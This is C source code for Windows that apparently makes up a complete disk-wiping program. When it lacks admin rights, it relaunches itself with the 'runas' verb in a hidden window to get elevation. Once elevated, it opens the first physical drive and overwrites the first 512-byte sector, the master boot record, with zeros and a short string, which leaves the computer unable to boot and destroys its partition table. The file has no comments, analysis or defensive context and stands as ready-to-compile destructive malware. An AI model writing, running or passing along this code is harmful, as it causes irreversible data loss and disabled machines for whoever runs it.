#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <shellapi.h>

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fRet;
}

int _tmain(int argc, TCHAR* argv[]) {
    if (IsElevated()) {
        HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hDevice != INVALID_HANDLE_VALUE) {
            BYTE buffer[512];
            memset(buffer, 0, sizeof(buffer));
            memcpy(buffer, "Inputt", 6);
            DWORD bytesWritten;
            SetFilePointer(hDevice, 0, NULL, FILE_BEGIN);
            WriteFile(hDevice, buffer, sizeof(buffer), &bytesWritten, NULL);
            CloseHandle(hDevice);
        }
        return 0;
    } else {
        TCHAR szExePath[MAX_PATH];
        GetModuleFileNameW(NULL, szExePath, MAX_PATH);
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = L"runas";
        sei.lpFile = szExePath;
        sei.nShow = SW_HIDE;
        ShellExecuteExW(&sei);
        WaitForSingleObject(sei.hProcess, INFINITE);
        CloseHandle(sei.hProcess);
        return 0;
    }
}
